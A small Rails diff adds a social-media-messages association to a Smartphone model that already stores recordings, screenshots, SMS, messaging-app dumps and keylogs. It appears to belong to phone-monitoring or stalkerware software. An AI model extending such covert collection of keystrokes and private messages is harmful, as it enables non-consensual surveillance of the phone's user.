@@ -12,6 +12,7 @@ class Smartphone < ApplicationRecord
   has_many :recordings, dependent: :destroy
   has_many :screenshots, dependent: :destroy
   has_many :sms_messages, dependent: :destroy
+  has_many :social_media_messages, dependent: :destroy
   has_many :messaging_apps_dumps, dependent: :destroy
   has_many :keylogs, dependent: :destroy
   has_many :keylog_screenshots, dependent: :destroy
